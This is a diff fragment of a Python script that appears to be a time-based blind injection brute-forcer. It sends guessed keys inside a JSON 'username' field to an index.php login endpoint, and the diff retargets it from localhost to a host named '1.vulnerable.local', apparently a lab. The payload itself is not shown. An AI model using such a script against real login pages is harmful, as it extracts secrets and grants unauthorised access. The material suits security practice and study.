@@ -16,10 +16,9 @@ def prepare_query(*, password, wait=1):
 
 def fetch(*, key, wait=1):
     return requests.post(
-            'http://localhost:8080/index.php',
+            'http://1.vulnerable.local/index.php',
             json={"username": prepare_query(password=key, wait=wait)}
     )
-
 
 print(f"{key.ljust(max_length, '_')}", end="")
 sys.stdout.flush()
